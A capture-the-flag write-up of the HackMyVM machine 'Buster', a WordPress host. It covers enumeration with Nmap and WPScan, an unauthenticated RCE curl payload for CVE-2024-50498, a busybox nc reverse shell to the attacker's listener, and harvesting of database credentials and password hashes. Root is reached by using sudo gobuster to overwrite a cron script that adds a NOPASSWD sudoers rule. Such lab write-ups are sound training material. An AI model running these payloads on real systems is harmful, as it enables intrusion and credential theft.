# Buster

## Executive Summary

| Machine  | Author | Category | Platform   |
| :------- | :----- | :------- | :--------- |
| Buster   | tao    | Beginner | HackMyVM   |

**Summary:** Buster is a beginner-level Linux machine running a WordPress site backed by nginx. The attack path begins with network discovery and a full-port Nmap scan, followed by deep WordPress enumeration via WPScan. The scanner reveals a critically vulnerable plugin — `wp-query-console` (CVE-2024-50498) — that allows **unauthenticated remote code execution** through a REST API endpoint. PHP's `shell_exec` is not disabled, enabling a reverse shell as `www-data`. Post-exploitation of `wp-config.php` yields database credentials; a MySQL query dumps WordPress password hashes, one of which is cracked with John the Ripper to recover the `welcome` user's password. Lateral movement to `welcome` reveals a `sudo` rule allowing passwordless execution of `/usr/bin/gobuster`. Process monitoring via `pspy64` exposes a root-owned cron job that runs `/opt/.test.sh` every minute. The attacker weaponizes `gobuster`'s `-o` (output) flag to overwrite `/opt/.test.sh` with a path pointing to a pre-staged payload script on the target filesystem — which the cron job then executes as root, injecting a passwordless sudo rule for `welcome`. A single `sudo su` completes the privilege escalation chain.

---

## Reconnaissance

### Network Discovery

The attacker began by scanning the local network segment (`192.168.100.0/24`) using a custom PowerShell script to identify live VirtualBox guests.

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.133 08:00:27:3A:19:ED VirtualBox
```

The target was identified at **192.168.100.133**.

---

### Port Scanning

A full-port aggressive Nmap scan was run to enumerate all services, versions, and default scripts.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/buster]
└─$ nmap -sC -sV -p- -T4 192.168.100.133
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-26 19:08 WIB
Nmap scan report for 192.168.100.133
Host is up (0.0018s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)
| ssh-hostkey:
|   2048 c2:91:d9:a5:f7:a3:98:1f:c1:4a:70:28:aa:ba:a4:10 (RSA)
|   256 3e:1f:c9:eb:c0:6f:24:06:fc:52:5f:2f:1b:35:33:ec (ECDSA)
|_  256 ec:64:87:04:9a:4b:32:fe:2d:1f:9a:b0:81:d3:7c:cf (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-generator: WordPress 6.7.1
|_http-server-header: nginx/1.14.2
| http-robots.txt: 1 disallowed entry
|_/wp-admin/
|_http-title: bammmmuwe
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.46 seconds
```

**Key findings:**
- **Port 22** — OpenSSH 7.9p1 (Debian Buster / `deb10u4`)
- **Port 80** — nginx/1.14.2 serving **WordPress 6.7.1**, site title `bammmmuwe`
- `robots.txt` disallows `/wp-admin/` — confirms WordPress admin panel
- OS fingerprinting points to **Debian 10 (Buster)**

---

### WordPress Enumeration — WPScan

With WordPress confirmed, WPScan was launched in aggressive mode to enumerate plugins, themes, users, and vulnerabilities.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/buster]
└─$ wpscan --url http://192.168.100.133 --api-token [REDACTED] -e u,vt,ap --plugins-detection aggressive
         _______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.100.133/ [192.168.100.133]
[+] Started: Fri Feb 27 09:11:15 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: nginx/1.14.2
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://192.168.100.133/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.100.133/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.100.133/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.100.133/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.7.1 identified (Insecure, released on 2024-11-21).
 | Found By: Meta Generator (Passive Detection)
 |  - http://192.168.100.133/, Match: 'WordPress 6.7.1'
 | Confirmed By: Rss Generator (Aggressive Detection)
 |  - http://192.168.100.133/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>
 |  - http://192.168.100.133/comments/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: WP < 6.8.3 - Author+ DOM Stored XSS
 |     Fixed in: 6.7.4
 |     References:
 |      - https://wpscan.com/vulnerability/c4616b57-770f-4c40-93f8-29571c80330a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58674
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-cross-site-scripting-xss-vulnerability
 |      -  https://wordpress.org/news/2025/09/wordpress-6-8-3-release/
 |
 | [!] Title: WP < 6.8.3 - Contributor+ Sensitive Data Disclosure
 |     Fixed in: 6.7.4
 |     References:
 |      - https://wpscan.com/vulnerability/1e2dad30-dd95-4142-903b-4d5c580eaad2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58246
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-sensitive-data-exposure-vulnerability
 |      - https://wordpress.org/news/2025/09/wordpress-6-8-3-release/

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Aggressive Methods)
 Checkin Checking Known Locations - Time: 00:19:03 <=============================                                           > (48181 / 117253) 41.09%  ETA:  Checkin Checking Known Locations - Time: 00:19:05 <=============================                                           > (48229 / 117253) 41.13%  ETA:  Checking Known Locations - Time: 00:42:42 <======================================================================> (117253 / 117253) 100.00% Time: 00:42:42
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://192.168.100.133/wp-content/plugins/akismet/
 | Last Updated: 2025-11-12T16:31:00.000Z
 | Readme: http://192.168.100.133/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 5.6
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.100.133/wp-content/plugins/akismet/, status: 200
 |
 | Version: 5.3.5 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.100.133/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.100.133/wp-content/plugins/akismet/readme.txt

[+] feed
 | Location: http://192.168.100.133/wp-content/plugins/feed/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.100.133/wp-content/plugins/feed/, status: 200
 |
 | The version could not be determined.

[+] wp-query-console
 | Location: http://192.168.100.133/wp-content/plugins/wp-query-console/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2018-03-16T16:03:00.000Z
 | Readme: http://192.168.100.133/wp-content/plugins/wp-query-console/README.txt
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.100.133/wp-content/plugins/wp-query-console/, status: 403
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: WP Query Console <= 1.0 - Unauthenticated Remote Code Execution
 |     References:
 |      - https://wpscan.com/vulnerability/f911568d-5f79-49b7-8ce4-fa0da3183214
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-50498
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/ae07ca12-e827-43f9-8cbb-275b9abbd4c3
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.100.133/wp-content/plugins/wp-query-console/README.txt

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:13 <============================================================================> (652 / 652) 100.00% Time: 00:00:13

[i] No themes Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==============================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] ta0
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://192.168.100.133/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Rss Generator (Aggressive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] welcome
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 4
 | Requests Remaining: 19

[+] Finished: Fri Feb 27 09:54:34 2026
[+] Requests Done: 117952
[+] Cached Requests: 42
[+] Data Sent: 31.792 MB
[+] Data Received: 35.733 MB
[+] Memory used: 457.32 MB
[+] Elapsed time: 00:43:19
```

**Critical finding — `wp-query-console` plugin:**

| Detail | Value |
| :----- | :---- |
| Plugin | wp-query-console |
| Version | 1.0 |
| CVE | CVE-2024-50498 |
| Severity | Critical — Unauthenticated RCE |
| Endpoint | `/wp-json/wqc/v1/query` |

Two WordPress users were identified: **`ta0`** (admin / author) and **`welcome`** (secondary user).

---

## Initial Access

### CVE-2024-50498 — Unauthenticated RCE via WP Query Console

The `wp-query-console` plugin v1.0 exposes a REST API endpoint (`/wp-json/wqc/v1/query`) that accepts arbitrary PHP code via the `queryArgs` parameter **without any authentication check**. This was confirmed functional via a PoC at [https://github.com/RandomRobbieBF/CVE-2024-50498](https://github.com/RandomRobbieBF/CVE-2024-50498).

#### Step 1 — Confirming Code Execution via `phpinfo()`

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/buster]
└─$ curl -X POST http://192.168.100.133/wp-json/wqc/v1/query -H "Content-Type: application/json" -d '{"queryArgs":"phpinfo();","queryType":"post"}'
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head>
<style type="text/css">
body {background-color: #fff; color: #222; font-family: sans-serif;}
pre {margin: 0; font-family: monospace;}
a:link {color: #009; text-decoration: none; background-color: #fff;}
a:hover {text-decoration: underline;}
table {border-collapse: collapse; border: 0; width: 934px; box-shadow: 1px 2px 3px #ccc;}
.center {text-align: center;}
.center table {margin: 1em auto; text-align: left;}
.center th {text-align: center !important;}
td, th {border: 1px solid #666; font-size: 75%; vertical-align: baseline; padding: 4px 5px;}
h1 {font-size: 150%;}
h2 {font-size: 125%;}
.p {text-align: left;}
.e {background-color: #ccf; width: 300px; font-weight: bold;}
.h {background-color: #99c; font-weight: bold;}
.v {background-color: #ddd; max-width: 300px; overflow-x: auto; word-wrap: break-word;}
.v i {color: #999;}
img {float: right; border: 0;}
hr {width: 934px; background-color: #ccc; border: 0; height: 1px;}
</style>
<title>PHP 7.3.31-1~deb10u7 - phpinfo()</title><meta name="ROBOTS" content="NOINDEX,NOFOLLOW,NOARCHIVE" /></head>
<body><div class="center">
<table>
<tr class="h"><td>
<a href="http://www.php.net/"><img border="0" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHkAAABACAYAAAA+j9gsAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAD4BJREFUeNrsnX
...
<tr><td class="e">disable_functions</td><td class="v">passthru,exec,system,popen,chroot,scandir,chgrp,chown,escapesh</td><td class="v">passthru,exec,system,popen,chroot,scandir,chgrp,chown,escapesh</td></tr>
...
```

The `phpinfo()` output confirms the server runs **PHP 7.3.31-1~deb10u7**. Inspecting `disable_functions` reveals:

```
passthru, exec, system, popen, chroot, scandir, chgrp, chown, escapesh...
```

Notably, **`shell_exec` is absent from the disable list** — it is fully available and can be used to execute system commands and spawn a reverse shell.

---

#### Step 2 — Reverse Shell via `shell_exec` and `busybox nc`

A netcat listener was started on the attacker machine:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/buster]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
```

The reverse shell payload was delivered through the same unauthenticated REST endpoint, using `busybox nc` (which supports the `-e` flag unlike standard Debian netcat):

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/buster]
└─$ curl -X POST http://192.168.100.133/wp-json/wqc/v1/query -H "Content-Type: application/json" -d '{"queryArgs":"shell_exec(\"busybox nc 192.168.100.1 4444 -e /bin/bash\");","queryType":"post"}'
```

The listener caught the connection:

```bash
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 63440
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@listen:~/html/wordpress$ ^Z
zsh: suspended  nc -lnvp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/buster]
└─$ stty raw -echo; fg
[1]  + continued  nc -lnvp 4444

www-data@listen:~/html/wordpress$ export SHELL=bash
www-data@listen:~/html/wordpress$ export TERM=xterm
www-data@listen:~/html/wordpress$ stty rows 73 cols 124
```

A fully interactive TTY was established as **`www-data`** on host `listen`.

---

### Post-Exploitation — Credential Harvesting

#### System Users

```bash
www-data@listen:~/html/wordpress$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
welcome:x:1001:1001::/home/welcome:/bin/sh
```

Two shell-enabled users exist: `root` and `welcome`.

#### WordPress Database Credentials from `wp-config.php`

```bash
www-data@listen:~/html/wordpress$ cat wp-config.php
...
// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'll104567' );

/** Database password */
define( 'DB_PASSWORD', 'thehandsomeguy' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
...
```

Credentials: **`ll104567` / `thehandsomeguy`**

#### Dumping WordPress User Hashes from MySQL

```bash
www-data@listen:~/html/wordpress$ mysql -u ll104567 -pthehandsomeguy -e "USE wordpress; SELECT user_login, user_pass FROM wp_users;"
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| ta0        | $P$BDDc71nM67DbOVN/U50WFGII6EF6.r. |
| welcome    | $P$BtP9ZghJTwDfSn1gKKc.k3mq4Vo.Ko/ |
+------------+------------------------------------+
```

Both WordPress users' phpass hashes were extracted.

---

### Password Cracking — John the Ripper

Both hashes were saved to `hashes.txt` and fed to John the Ripper with the `rockyou.txt` wordlist:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/buster]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1[REDACTED]           (welcome)
```

John successfully cracked the password for user **`welcome`**. The `ta0` hash was not cracked within the wordlist.

---

### Lateral Movement — `www-data` → `welcome`

Using the cracked password, the session was escalated to `welcome`:

```bash
www-data@listen:~/html/wordpress$ su - welcome
Password:
$ id
uid=1001(welcome) gid=1001(welcome) groups=1001(welcome)
$ bash
welcome@listen:~$ ls -la
total 12
drwx------ 2 welcome welcome 4096 Jan  7  2025 .
drwxr-xr-x 3 root    root    4096 Jan  7  2025 ..
-rw-r--r-- 1 root    root      33 Jan  7  2025 user.txt
welcome@listen:~$ sudo -l
Matching Defaults entries for welcome on listen:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on listen:
    (ALL) NOPASSWD: /usr/bin/gobuster
```

The `user.txt` flag is readable and `sudo -l` reveals that **`welcome` can run `gobuster` as root without a password** — a non-standard, dangerous sudo rule.

---

## Privilege Escalation

### Cron Job Discovery via `pspy64`

Since direct write access to privileged locations was unavailable, `pspy64` (a process monitor that doesn't require root) was transferred to detect scheduled tasks:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/opt]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
172.21.32.1 - - [27/Feb/2026 10:42:20] "GET /pspy64 HTTP/1.1" 200 -
```

```bash
welcome@listen:~$ wget http://192.168.100.1:8080/pspy64
--2026-02-26 22:42:18--  http://192.168.100.1:8080/pspy64
Connecting to 192.168.100.1:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: 'pspy64'

pspy64                         100%[====================================================>]   2.96M  --.-KB/s    in 0.1s

2026-02-26 22:42:18 (26.7 MB/s) - 'pspy64' saved [3104768/3104768]
```

```bash
welcome@listen:~$ chmod +x pspy64
welcome@listen:~$ ./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
...
2026/02/26 22:44:01 CMD: UID=0     PID=1633   | /usr/sbin/CRON -f
2026/02/26 22:44:01 CMD: UID=0     PID=1634   | /usr/sbin/CRON -f
2026/02/26 22:44:01 CMD: UID=0     PID=1635   | /bin/sh -c /bin/bash /opt/.test.sh
```

**Key observation:** UID=0 (root) is executing `/bin/bash /opt/.test.sh` every minute via cron.

```bash
welcome@listen:~$ ls -la /opt
total 12
drwxr-xr-x  2 root root 4096 Jan  7  2025 .
drwxr-xr-x 18 root root 4096 Jan  7  2025 ..
-rwx------  1 root root   10 Jan  7  2025 .test.sh
```

The file `/opt/.test.sh` is owned by root (`rwx------`) — `welcome` cannot write to it directly. However, `gobuster`'s `-o` (output) flag writes scan results to a file path of the attacker's choosing, **and it runs as root via sudo**. This is the privilege escalation vector.

---

### Exploiting `sudo gobuster` + Cron to Overwrite `/opt/.test.sh`

#### The Attack Plan

1. On the **target**: create a payload script at `/tmp/buster/root` that injects a passwordless sudo rule for `welcome`.
2. Create a wordlist containing the path `tmp/buster/root`.
3. On the **attacker machine**: host an HTTP server from `/` so `http://192.168.100.1:8080/tmp/buster/root` returns HTTP 200.
4. Run `sudo gobuster` targeting the attacker's HTTP server with the wordlist and `-o /opt/.test.sh`. Gobuster finds the path, outputs `/tmp/buster/root` to `/opt/.test.sh`.
5. When cron fires, root runs `bash /opt/.test.sh`, which executes `/tmp/buster/root` on the **target** — the payload script — granting `welcome` full sudo.

#### Step-by-Step Execution

**On the target — prepare the payload and wordlist:**

```bash
welcome@listen:~$ mkdir /tmp/buster
welcome@listen:~$ echo 'tmp/buster/root' > /tmp/wordlist
welcome@listen:~$ echo 'echo "welcome ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers.d/welcome' > /tmp/buster/root
welcome@listen:~$ chmod +x /tmp/buster/root
```

**On the attacker machine — stage the HTTP server:**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/]
└─$ mkdir /tmp/buster

┌──(ouba㉿CLIENT-DESKTOP)-[/]
└─$ touch /tmp/buster/root

┌──(ouba㉿CLIENT-DESKTOP)-[/]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

The attacker creates an empty `/tmp/buster/root` on their machine and serves the entire filesystem from `/`. This ensures that when gobuster requests `http://192.168.100.1:8080/tmp/buster/root`, it receives HTTP 200 (the empty file exists), causing gobuster to include the path in its output.

**On the target — trigger gobuster to overwrite `/opt/.test.sh`:**

```bash
welcome@listen:~$ sudo /usr/bin/gobuster -w /tmp/wordlist -u http://192.168.100.1:8080 -n -q -o /opt/.test.sh
/tmp/buster/root
```

Flags breakdown:
- `-w /tmp/wordlist` — wordlist containing `tmp/buster/root`
- `-u http://192.168.100.1:8080` — attacker's HTTP server
- `-n` — suppress status codes in output (clean path only)
- `-q` — quiet mode (no banner)
- `-o /opt/.test.sh` — write output **directly to the root-owned cron script** (possible because gobuster runs as root via sudo)

**Attacker's HTTP server confirms the hit:**

```bash
172.21.32.1 - - [27/Feb/2026 11:50:21] "GET / HTTP/1.1" 200 -
172.21.32.1 - - [27/Feb/2026 11:50:21] code 404, message File not found
172.21.32.1 - - [27/Feb/2026 11:50:21] "GET /4b05ceb9-67fb-43af-bd65-126dc587083d HTTP/1.1" 404 -
172.21.32.1 - - [27/Feb/2026 11:50:21] "GET /tmp/buster/root HTTP/1.1" 200 -
```

`/opt/.test.sh` now contains the single line `/tmp/buster/root`. The next time cron fires (`bash /opt/.test.sh` as root), it executes the file `/tmp/buster/root` **on the target machine**, which runs:

```bash
echo "welcome ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers.d/welcome
```

---

### Root Shell

After waiting for the one-minute cron cycle:

```bash
welcome@listen:~$ sudo su
root@listen:/home/welcome# cd
root@listen:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
listen
```

Full root access achieved.

---

### Flags

```bash
root@listen:~# cat /home/welcome/user.txt
29e[REDACTED]

root@listen:~# cat /root/R00t_fl4g_is_HHHHerererererrererere.txt
b6a[REDACTED]
```

| Flag | Location | Value |
| :--- | :------- | :---- |
| User | `/home/welcome/user.txt` | `29e[REDACTED]` |
| Root | `/root/R00t_fl4g_is_HHHHerererererrererere.txt` | `b6a[REDACTED]` |

---

## Attack Chain Summary

1. **Reconnaissance**: Network sweep identified target at `192.168.100.133`; Nmap full-port scan revealed nginx/1.14.2 serving WordPress 6.7.1 on port 80 and OpenSSH 7.9p1 on port 22 (Debian 10/Buster).

2. **Vulnerability Discovery**: WPScan with aggressive plugin detection identified `wp-query-console` v1.0 — a critically vulnerable plugin (CVE-2024-50498) exposing an unauthenticated RCE REST endpoint. Two WordPress users also enumerated: `ta0` and `welcome`.

3. **Exploitation**: Delivered `phpinfo()` via the `/wp-json/wqc/v1/query` endpoint to confirm `shell_exec` was not in `disable_functions`. Executed a `busybox nc` reverse shell payload via `shell_exec`, obtaining a shell as `www-data`.

4. **Credential Harvesting & Lateral Movement**: Extracted DB credentials from `wp-config.php` (`ll104567`/`thehandsomeguy`); queried MySQL to dump phpass hashes for `ta0` and `welcome`; cracked `welcome`'s hash with John the Ripper + rockyou.txt; used the cracked password to `su - welcome`.

5. **Privilege Escalation**: `sudo -l` revealed `welcome` could run `/usr/bin/gobuster` as root without a password. `pspy64` exposed a root cron job executing `/opt/.test.sh` every minute. Exploited gobuster's `-o` flag (running as root via sudo) to overwrite `/opt/.test.sh` with the path `/tmp/buster/root`. A pre-staged payload at `/tmp/buster/root` on the target injected a passwordless sudo rule for `welcome` into `/etc/sudoers.d/welcome`. After the cron cycle, `sudo su` yielded a full root shell and both flags were captured.
